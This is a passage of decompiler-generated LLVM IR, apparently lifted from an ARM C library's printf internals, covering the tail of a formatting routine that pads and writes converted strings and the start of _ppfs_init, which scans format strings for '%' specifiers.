dec_label_pc_13264:                               ; preds = %bb162
  %v0_13264 = load i32, i32* @sl, align 4
  store i32 %v0_13264, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_13264, i32* @r6, align 4
  br label %dec_label_pc_13354

dec_label_pc_13278:                               ; preds = %dec_label_pc_13218
  store i32 %v2_13320, i32* %r8.global-to-local, align 4
  %v2_1327c = load i32, i32* %v1_13030, align 4
  store i32 %v2_13250, i32* %r2.global-to-local, align 4
  store i32 %v2_13320, i32* %r0.global-to-local, align 4
  %v3_13288 = call i32 @__GI_wcrtomb(i32 %v2_13320, i32 %v2_1327c, i32 %v2_13250)
  store i32 %v3_13288, i32* %r0.global-to-local, align 4
  %v7_1328c = icmp eq i32 %v3_13288, -1
  store i32 %v3_13288, i32* @r5, align 4
  br i1 %v7_1328c, label %dec_label_pc_134a4, label %dec_label_pc_13298

dec_label_pc_13298:                               ; preds = %dec_label_pc_13278
  %v0_13298 = load i32, i32* @sl, align 4
  store i32 %v0_13298, i32* @r4, align 4
  store i32 %v2_13320, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_132a8 = trunc i32 %v0_13298 to i8
  %v2_132a8 = load i32, i32* %r8.global-to-local, align 4
  %v4_132a8 = add i32 %v2_132a8, %v3_13288
  %v5_132a8 = inttoptr i32 %v4_132a8 to i8*
  store i8 %v1_132a8, i8* %v5_132a8, align 1
  %v0_13358.pre.pre = load i32, i32* @r5, align 4
  %v1_13358.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13354thread-pre-split

dec_label_pc_132b0:                               ; preds = %dec_label_pc_13210
  br i1 %v3_132b4, label %dec_label_pc_13314, label %dec_label_pc_132b8

dec_label_pc_132b8:                               ; preds = %dec_label_pc_132b0
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_132c0 = load i32, i32* %v1_13030, align 4
  br i1 %v7_132b0, label %dec_label_pc_132c0, label %dec_label_pc_132ec

dec_label_pc_132c0:                               ; preds = %dec_label_pc_132b8
  store i32 %v2_132c0, i32* @r6, align 4
  %v2_132c4 = icmp eq i32 %v2_132c0, 0
  br i1 %v2_132c4, label %dec_label_pc_13340, label %dec_label_pc_132cc

dec_label_pc_132cc:                               ; preds = %dec_label_pc_132c0, %dec_label_pc_1331c
  %v0_132dc = phi i32 [ %v2_132c0, %dec_label_pc_132c0 ], [ %v3_1332c, %dec_label_pc_1331c ]
  %v3_132cc = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_132cc, i32* %r3.global-to-local, align 4
  %v5_132d8 = icmp slt i32 %v3_132cc, -1
  br i1 %v5_132d8, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_132cc
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_132cc, %bb163
  %storemerge194 = phi i32 [ %v3_132cc, %bb163 ], [ -1, %dec_label_pc_132cc ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_132dc, i32* %r0.global-to-local, align 4
  %v1_132e0 = inttoptr i32 %v0_132dc to i8*
  %v2_132e0 = call i32 @strnlen(i8* %v1_132e0)
  store i32 %v2_132e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13348

dec_label_pc_132ec:                               ; preds = %dec_label_pc_132b8
  store i32 %v2_132c0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_13320, i32* @r6, align 4
  store i32 %v2_132c0, i32* %stack_var_-180, align 4
  br label %dec_label_pc_13354thread-pre-split

dec_label_pc_13314:                               ; preds = %dec_label_pc_132b0
  br i1 %v7_13314, label %dec_label_pc_1331c, label %dec_label_pc_134a4

dec_label_pc_1331c:                               ; preds = %dec_label_pc_13314
  %v0_1331c = call i32 @__errno_location()
  store i32 %v0_1331c, i32* %r0.global-to-local, align 4
  %v1_13324 = inttoptr i32 %v0_1331c to i32*
  %v2_13324 = load i32, i32* %v1_13324, align 4
  store i32 %v2_13324, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_1332c = call i32 @__GI___glibc_strerror_r(i32 %v2_13324, i32 %v2_13320, i32 128)
  store i32 %v3_1332c, i32* %r0.global-to-local, align 4
  store i32 %v3_1332c, i32* @r6, align 4
  br label %dec_label_pc_132cc

dec_label_pc_13338:                               ; preds = %dec_label_pc_131c4, %.thread26, %bb160
  %v0_13358.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_13158, %dec_label_pc_131c4 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13354thread-pre-split

dec_label_pc_13340:                               ; preds = %dec_label_pc_132c0, %dec_label_pc_13228
  store i32 ptrtoint ([7 x i8]* @global_var_1fec8.1049 to i32), i32* @r6, align 4
  br label %dec_label_pc_13348

dec_label_pc_13348:                               ; preds = %bb164, %dec_label_pc_13340
  %storemerge = phi i32 [ 6, %dec_label_pc_13340 ], [ %v2_132e0, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_13354

dec_label_pc_13354thread-pre-split:               ; preds = %.thread90, %dec_label_pc_13298, %dec_label_pc_132ec, %dec_label_pc_13338
  %v1_13358.pre = phi i32 [ 0, %dec_label_pc_13338 ], [ %v1_13358.pre.pre, %dec_label_pc_13298 ], [ 0, %dec_label_pc_132ec ], [ %v2_131c4, %.thread90 ]
  %v0_13358.pre = phi i32 [ %v0_13358.pre81, %dec_label_pc_13338 ], [ %v0_13358.pre.pre, %dec_label_pc_13298 ], [ 1, %dec_label_pc_132ec ], [ %v1_13158, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_1314c, %dec_label_pc_13338 ], [ %v0_13078, %dec_label_pc_13298 ], [ %v0_13078, %dec_label_pc_132ec ], [ %v0_1314c, %.thread90 ]
  %v0_13354.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_13354

dec_label_pc_13354:                               ; preds = %dec_label_pc_13354thread-pre-split, %dec_label_pc_13264, %dec_label_pc_13348
  %v1_13394 = phi i32 [ %v1_13358.pre, %dec_label_pc_13354thread-pre-split ], [ %v0_13264, %dec_label_pc_13264 ], [ 0, %dec_label_pc_13348 ]
  %v0_13358 = phi i32 [ %v0_13358.pre, %dec_label_pc_13354thread-pre-split ], [ %v0_13254, %dec_label_pc_13264 ], [ %storemerge, %dec_label_pc_13348 ]
  %v0_13360 = phi i32 [ %v0_13354.pr, %dec_label_pc_13354thread-pre-split ], [ 11, %dec_label_pc_13264 ], [ 11, %dec_label_pc_13348 ]
  %v0_1339c = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_13354thread-pre-split ], [ %v0_13078, %dec_label_pc_13264 ], [ %v0_13078, %dec_label_pc_13348 ]
  %v7_13354 = icmp eq i32 %v0_13360, 11
  %v2_13358 = add i32 %v0_13358, %v1_13394
  br i1 %v7_13354, label %dec_label_pc_13370, label %bb165

bb165:                                            ; preds = %dec_label_pc_13354
  %v7_13368 = icmp sgt i32 %v0_13360, 5
  %. = select i1 %v7_13368, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_1336c = add i32 %., %v2_13358
  br label %dec_label_pc_13370

dec_label_pc_13370:                               ; preds = %dec_label_pc_13354, %bb165
  %v0_13384 = phi i32 [ %v2_13358, %dec_label_pc_13354 ], [ %v2_1336c, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_13374 = sub i32 %tmp97, %v0_13384
  %v3_13374 = icmp uge i32 %tmp97, %v0_13384
  %v9_13374 = icmp eq i32 %tmp97, %v0_13384
  %v2_13378 = xor i1 %v3_13374, true
  %v3_13378 = or i1 %v9_13374, %v2_13378
  br i1 %v3_13378, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_13370
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_13370, %bb166
  %v2_1337c = xor i1 %v9_13374, true
  %v3_1337c = and i1 %v3_13374, %v2_1337c
  br i1 %v3_1337c, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_13384.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_13374, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_13394 = phi i32 [ %v1_13384.pre, %._crit_edge ], [ %v2_13374, %bb168 ]
  %v2_13384 = add i32 %v0_13384, %stack_var_-336.2
  %v2_13388 = add i32 %v2_13384, %v2_13394
  store i32 %v2_13388, i32* %ip.global-to-local, align 4
  store i32 %v0_1339c, i32* %r3.global-to-local, align 4
  %v0_13390 = load i32, i32* @sb, align 4
  %v7_13390 = icmp eq i32 %v0_13390, 48
  br i1 %v7_13390, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_13394 = add i32 %v2_13394, %v1_13394
  store i32 %v3_13394, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_133b0 = phi i32 [ %v2_13394, %bb169 ], [ 0, %bb170 ]
  %v1_1339c = and i32 %v0_1339c, 8
  store i32 %v1_1339c, i32* @r8, align 4
  %v2_1339c = icmp eq i32 %v1_1339c, 0
  br i1 %v2_1339c, label %dec_label_pc_133a8, label %dec_label_pc_133c4

dec_label_pc_133a8:                               ; preds = %.thread29
  %v0_133a8 = load i32, i32* @fp, align 4
  store i32 %v0_133a8, i32* %r0.global-to-local, align 4
  store i32 %v0_133b0, i32* %r2.global-to-local, align 4
  %v4_133b4 = call i32 @_charpad(i32 %v0_133a8, i8 32, i32 %v0_133b0)
  store i32 %v4_133b4, i32* %r0.global-to-local, align 4
  %v1_133b8 = load i32, i32* @sl, align 4
  %v9_133b8 = icmp eq i32 %v4_133b4, %v1_133b8
  br i1 %v9_133b8, label %dec_label_pc_133c0, label %dec_label_pc_134a4

dec_label_pc_133c0:                               ; preds = %dec_label_pc_133a8
  %v0_133c0 = load i32, i32* @r8, align 4
  store i32 %v0_133c0, i32* @sl, align 4
  %v0_133cc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_133c4

dec_label_pc_133c4:                               ; preds = %.thread29, %dec_label_pc_133c0
  %v0_133cc = phi i32 [ %v0_13360, %.thread29 ], [ %v0_133cc.pre, %dec_label_pc_133c0 ]
  %v0_133c8 = load i32, i32* @fp, align 4
  %v2_133cc = add i32 %v0_133cc, ptrtoint (i32* @global_var_1fed0.1051 to i32)
  store i32 %v2_133cc, i32* %r0.global-to-local, align 4
  %v2_133d0 = inttoptr i32 %v2_133cc to i8*
  %v3_133d0 = call i32 @__GI_fputs_unlocked(i8* %v2_133d0, i32 %v0_133c8)
  %v0_133d4 = load i32, i32* @fp, align 4
  store i32 %v0_133d4, i32* %r0.global-to-local, align 4
  %v0_133dc = load i32, i32* @r4, align 4
  store i32 %v0_133dc, i32* %r2.global-to-local, align 4
  %v4_133e0 = call i32 @_charpad(i32 %v0_133d4, i8 48, i32 %v0_133dc)
  store i32 %v4_133e0, i32* %r0.global-to-local, align 4
  %v1_133e4 = load i32, i32* @r4, align 4
  %v9_133e4 = icmp eq i32 %v4_133e0, %v1_133e4
  br i1 %v9_133e4, label %dec_label_pc_133ec, label %dec_label_pc_134a4

dec_label_pc_133ec:                               ; preds = %dec_label_pc_133c4
  %v3_133ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_133ec, i32* %r3.global-to-local, align 4
  %v2_133f0 = icmp eq i32 %v3_133ec, 0
  br i1 %v2_133f0, label %dec_label_pc_13400, label %dec_label_pc_13460thread-pre-split

dec_label_pc_13400:                               ; preds = %dec_label_pc_133ec
  %v0_13400 = load i32, i32* @r5, align 4
  %v2_13400 = icmp eq i32 %v0_13400, 0
  br i1 %v2_13400, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_13400
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_13400
  %v1_13408 = load i32, i32* @r6, align 4
  store i32 %v1_13408, i32* %r0.global-to-local, align 4
  %v1_13410 = load i32, i32* @fp, align 4
  store i32 %v1_13410, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 78872, i32* @lr, align 4
  %v1_13414 = xor i1 %v2_13400, true
  call void @__pseudo_cond_branch(i1 %v1_13414, i32 ptrtoint (i32* @global_var_164d4.1042 to i32))
  %v0_13418 = load i32, i32* %r0.global-to-local, align 4
  %v1_13418 = load i32, i32* @r5, align 4
  %v9_13418 = icmp eq i32 %v0_13418, %v1_13418
  br i1 %v9_13418, label %dec_label_pc_13478, label %dec_label_pc_134a4

dec_label_pc_13424:                               ; preds = %dec_label_pc_13460
  %v2_13424 = icmp ult i32 %v1_13428, 128
  %.v1_13428 = select i1 %v2_13424, i32 %v1_13428, i32 128
  store i32 %.v1_13428, i32* @r2, align 4
  %v0_13430 = call i32 @__GI_wcsrtombs()
  store i32 %v0_13430, i32* @r4, align 4
  %v2_13434 = icmp eq i32 %v0_13430, 0
  store i32 %v0_13430, i32* %r3.global-to-local, align 4
  store i32 %v2_13320, i32* %r0.global-to-local, align 4
  %v0_13444 = load i32, i32* @fp, align 4
  store i32 %v0_13444, i32* %r2.global-to-local, align 4
  br i1 %v2_13434, label %dec_label_pc_13454, label %dec_label_pc_1344c

dec_label_pc_1344c:                               ; preds = %dec_label_pc_13424
  %v3_1344c = call i32 @__stdio_fwrite(i32 %v2_13320, i32 %v0_13430, i32 %v0_13444)
  store i32 %v3_1344c, i32* %r0.global-to-local, align 4
  store i32 %v3_1344c, i32* %r3.global-to-local, align 4
  %v1_13454.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13454

dec_label_pc_13454:                               ; preds = %dec_label_pc_13424, %dec_label_pc_1344c
  %v1_13454 = phi i32 [ 0, %dec_label_pc_13424 ], [ %v1_13454.pre, %dec_label_pc_1344c ]
  %v0_13458 = phi i32 [ 0, %dec_label_pc_13424 ], [ %v3_1344c, %dec_label_pc_1344c ]
  %v9_13454 = icmp eq i32 %v0_13458, %v1_13454
  %v1_13458 = load i32, i32* @r5, align 4
  %v2_13458 = sub i32 %v1_13458, %v0_13458
  store i32 %v2_13458, i32* @r5, align 4
  br i1 %v9_13454, label %dec_label_pc_13460, label %dec_label_pc_134a4

dec_label_pc_13460thread-pre-split:               ; preds = %dec_label_pc_133ec
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_13464.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_13460

dec_label_pc_13460:                               ; preds = %dec_label_pc_13460thread-pre-split, %dec_label_pc_13454
  %v1_13428 = phi i32 [ %v0_13464.pr, %dec_label_pc_13460thread-pre-split ], [ %v2_13458, %dec_label_pc_13454 ]
  store i32 %v2_13320, i32* @r6, align 4
  %v2_13464 = icmp eq i32 %v1_13428, 0
  store i32 %v2_1323c, i32* @r1, align 4
  store i32 %v2_13250, i32* %r3.global-to-local, align 4
  store i32 %v2_13320, i32* @r0, align 4
  br i1 %v2_13464, label %dec_label_pc_13478, label %dec_label_pc_13424

dec_label_pc_13478:                               ; preds = %dec_label_pc_13460, %.thread36
  %v0_13478 = load i32, i32* @fp, align 4
  store i32 %v0_13478, i32* %r0.global-to-local, align 4
  %v0_13480 = load i32, i32* @sl, align 4
  store i32 %v0_13480, i32* %r2.global-to-local, align 4
  %v4_13484 = call i32 @_charpad(i32 %v0_13478, i8 32, i32 %v0_13480)
  store i32 %v4_13484, i32* %r0.global-to-local, align 4
  %v1_13488 = load i32, i32* @sl, align 4
  %v9_13488 = icmp eq i32 %v4_13484, %v1_13488
  br i1 %v9_13488, label %dec_label_pc_13490, label %dec_label_pc_134a4

dec_label_pc_13490:                               ; preds = %dec_label_pc_13478, %dec_label_pc_13200, %dec_label_pc_13024
  %stack_var_-316.3 = phi i32 [ %v0_13078, %dec_label_pc_13024 ], [ %v0_1339c, %dec_label_pc_13478 ], [ %v0_13078, %dec_label_pc_13200 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_13024 ], [ %v2_13388, %dec_label_pc_13478 ], [ %v2_13204, %dec_label_pc_13200 ]
  %v3_13490 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_13490, i32* @r4, align 4
  br label %dec_label_pc_13494

dec_label_pc_13494:                               ; preds = %dec_label_pc_12f34, %dec_label_pc_13490
  %v0_13494 = phi i32 [ %v0_13494.pre, %dec_label_pc_12f34 ], [ %v3_13490, %dec_label_pc_13490 ]
  %v0_13078 = phi i32 [ %tmp100, %dec_label_pc_12f34 ], [ %stack_var_-316.3, %dec_label_pc_13490 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_12f34 ], [ %stack_var_-336.3, %dec_label_pc_13490 ]
  store i32 %v0_13494, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12f4c.outer

dec_label_pc_12f4c.outer:                         ; preds = %dec_label_pc_1349c, %dec_label_pc_13494
  %v5_12f78 = phi i32 [ %v1_12fa8, %dec_label_pc_1349c ], [ %v0_13494, %dec_label_pc_13494 ]
  %v0_12f4c49 = phi i32 [ %v1_1349c, %dec_label_pc_1349c ], [ %v0_13494, %dec_label_pc_13494 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_1349c ], [ %stack_var_-336.4, %dec_label_pc_13494 ]
  %v1_12f4c180 = inttoptr i32 %v0_12f4c49 to i8*
  %v2_12f4c181 = load i8, i8* %v1_12f4c180, align 1
  %v3_12f4c182 = zext i8 %v2_12f4c181 to i32
  store i32 %v3_12f4c182, i32* %r3.global-to-local, align 4
  %v2_12f50183 = icmp eq i8 %v2_12f4c181, 0
  br i1 %v2_12f50183, label %dec_label_pc_12f68, label %bb126

dec_label_pc_1349c:                               ; preds = %dec_label_pc_12fa8
  %v1_1349c = add i32 %v0_12fb0, 2
  store i32 %v1_1349c, i32* @r4, align 4
  br label %dec_label_pc_12f4c.outer

dec_label_pc_134a4:                               ; preds = %dec_label_pc_13314, %dec_label_pc_13478, %.thread36, %dec_label_pc_133c4, %dec_label_pc_133a8, %dec_label_pc_13278, %bb162, %dec_label_pc_131dc, %bb130, %dec_label_pc_13454
  br label %dec_label_pc_134ac

dec_label_pc_134ac:                               ; preds = %dec_label_pc_12f9c, %bb, %dec_label_pc_12f1c, %dec_label_pc_134a4
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_12f1c ], [ -1, %dec_label_pc_134a4 ], [ %stack_var_-336.2, %dec_label_pc_12f9c ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_12ed8, i32* @r5, align 4
  store i32 %v15_12ed8, i32* @r8, align 4
  store i32 %v18_12ed8, i32* @sb, align 4
  store i32 %v21_12ed8, i32* @sl, align 4
  store i32 %v24_12ed8, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_1349c, { 1, 0 }
  uselistorder i8 %v2_12f4c181, { 1, 2, 0 }
  uselistorder i32 %v0_12f4c49, { 2, 0, 1 }
  uselistorder i32 %v5_12f78, { 2, 3, 1, 0 }
  uselistorder i32 %v0_13078, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_13494, { 1, 0, 2 }
  uselistorder i32 %v1_13428, { 2, 1, 0 }
  uselistorder i32 %v0_13430, { 1, 0, 2, 3 }
  uselistorder i32 %v0_133b0, { 1, 0 }
  uselistorder i32 %v2_13394, { 2, 0, 1 }
  uselistorder i1 %v3_13374, { 1, 0 }
  uselistorder i32 %v0_13384, { 0, 2, 3, 1 }
  uselistorder i32 %v2_13358, { 1, 0 }
  uselistorder i32 %v0_1339c, { 1, 0, 2 }
  uselistorder i32 %v3_1332c, { 1, 2, 0 }
  uselistorder i32 %v0_132dc, { 1, 0 }
  uselistorder i32 %v2_132c0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_13288, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13254, { 1, 2, 0, 3 }
  uselistorder i32 %v1_13158, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_13174, { 1, 2, 3, 0 }
  uselistorder i32 %v6_130f4, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_13058, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_13008.pre, { 2, 1, 0 }
  uselistorder i32 %v1_13000, { 1, 0 }
  uselistorder i32 %v1_12fa8, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_12f68, { 1, 0 }
  uselistorder i32 %v1_12f60.lcssa, { 1, 0 }
  uselistorder i8 %v2_12f4c, { 1, 2, 0 }
  uselistorder i32 %v2_12f60, { 1, 2, 3, 0 }
  uselistorder i1 %v7_1316c, { 1, 0 }
  uselistorder i1 %v7_130b8, { 1, 2, 0 }
  uselistorder i1 %v7_132b0, { 1, 0 }
  uselistorder i1 %v7_13210, { 1, 0 }
  uselistorder i1 %v7_130fc, { 1, 0 }
  uselistorder i32 %v2_13250, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13320, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_13030, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_13004, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_12fe4, { 1, 2, 0 }
  uselistorder i32 %v4_12fdc, { 1, 0 }
  uselistorder i32 %v2_12ee0, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 5, 2, 3, 6, 7, 39, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 1, 21, 22, 23, 24, 25, 26, 38, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %r2.global-to-local, { 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 2, 22, 23, 25, 26, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 7, 6, 9, 8, 10, 11, 13, 12, 15, 14, 16, 17, 20, 18, 19, 22, 21, 24, 23, 26, 25, 28, 27, 32, 29, 30, 31, 2, 33, 34, 44, 35, 45, 1, 37, 36, 39, 38, 41, 40, 43, 42, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 87, { 0, 2, 1 }
  uselistorder label %dec_label_pc_134ac, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_134a4, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_13494, { 1, 0 }
  uselistorder label %dec_label_pc_13454, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_133c4, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_13370, { 1, 0 }
  uselistorder label %dec_label_pc_13354, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13354thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_13348, { 1, 0 }
  uselistorder label %dec_label_pc_13338, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_132cc, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_130a8, { 1, 0 }
  uselistorder label %dec_label_pc_130a4, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12ffc, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_12f9c, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_12f68, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_134cc = load i32, i32* @r4, align 4
  store i32 %v3_134cc, i32* %stack_var_-12, align 4
  %v6_134cc = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_134d8 = load i32, i32* @r1, align 4
  store i32 %v0_134d8, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_134e0 = bitcast i32* %arg1 to i8*
  %v3_134e0 = call i32 @__GI_memset(i8* %v2_134e0, i32 0)
  %v0_134e4 = load i32, i32* @r4, align 4
  %v1_134e4 = add i32 %v0_134e4, 24
  %v2_134e4 = inttoptr i32 %v1_134e4 to i32*
  %v3_134e4 = load i32, i32* %v2_134e4, align 4
  %v1_134e8 = add i32 %v3_134e4, -1
  store i32 %v1_134e8, i32* %v2_134e4, align 4
  %v0_134f0 = load i32, i32* @r5, align 4
  %v1_134f0 = load i32, i32* @r4, align 4
  %v2_134f0 = inttoptr i32 %v1_134f0 to i32*
  store i32 %v0_134f0, i32* %v2_134f0, align 4
  %v0_134f4 = load i32, i32* @r4, align 4
  %v1_134f4 = add i32 %v0_134f4, 40
  store i32 %v1_134f4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_1350419 = inttoptr i32 %v1_134f4 to i32*
  store i32 8, i32* %v2_1350419, align 4
  %v3_1350420 = load i32, i32* %r1.global-to-local, align 4
  %v4_1350421 = add i32 %v3_1350420, 4
  store i32 %v4_1350421, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_134fc.dec_label_pc_134fc_crit_edge

dec_label_pc_134fc.dec_label_pc_134fc_crit_edge:  ; preds = %entry, %dec_label_pc_134fc.dec_label_pc_134fc_crit_edge
  %v4_1350422 = phi i32 [ %v4_1350421, %entry ], [ %v4_13504, %dec_label_pc_134fc.dec_label_pc_134fc_crit_edge ]
  %v0_13500.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13500 = add i32 %v0_13500.pre, -1
  store i32 %v1_13500, i32* %r2.global-to-local, align 4
  %v7_13500 = icmp eq i32 %v0_13500.pre, 1
  %v2_13504 = inttoptr i32 %v4_1350422 to i32*
  store i32 8, i32* %v2_13504, align 4
  %v3_13504 = load i32, i32* %r1.global-to-local, align 4
  %v4_13504 = add i32 %v3_13504, 4
  store i32 %v4_13504, i32* %r1.global-to-local, align 4
  br i1 %v7_13500, label %dec_label_pc_1350c, label %dec_label_pc_134fc.dec_label_pc_134fc_crit_edge

dec_label_pc_1350c:                               ; preds = %dec_label_pc_134fc.dec_label_pc_134fc_crit_edge
  %v0_1350c = load i32, i32* @r5, align 4
  store i32 %v0_1350c, i32* %r2.global-to-local, align 4
  %v1_135503 = inttoptr i32 %v0_1350c to i8*
  %v2_135504 = load i8, i8* %v1_135503, align 1
  %v2_135546 = icmp eq i8 %v2_135504, 0
  br i1 %v2_135546, label %dec_label_pc_1355c, label %dec_label_pc_1351c

dec_label_pc_13514:                               ; preds = %dec_label_pc_13534
  %v2_13518 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13518, i32* @r4, align 4
  store i32 %v6_134cc, i32* @r5, align 4
  ret i32 -1

dec_label_pc_1351c:                               ; preds = %dec_label_pc_1350c, %dec_label_pc_13550.backedge
  %v0_13524 = phi i32 [ %storemerge, %dec_label_pc_13550.backedge ], [ %v0_1350c, %dec_label_pc_1350c ]
  %v2_135507 = phi i8 [ %v2_13550, %dec_label_pc_13550.backedge ], [ %v2_135504, %dec_label_pc_1350c ]
  %v7_1351c = icmp eq i8 %v2_135507, 37
  br i1 %v7_1351c, label %dec_label_pc_13524, label %dec_label_pc_1354c

dec_label_pc_13524:                               ; preds = %dec_label_pc_1351c
  %v1_13524 = add i32 %v0_13524, 1
  %v2_13524 = inttoptr i32 %v1_13524 to i8*
  %v3_13524 = load i8, i8* %v2_13524, align 1
  store i32 %v1_13524, i32* %r2.global-to-local, align 4
  %v7_13528 = icmp eq i8 %v3_13524, 37
  br i1 %v7_13528, label %dec_label_pc_1354c, label %dec_label_pc_13534

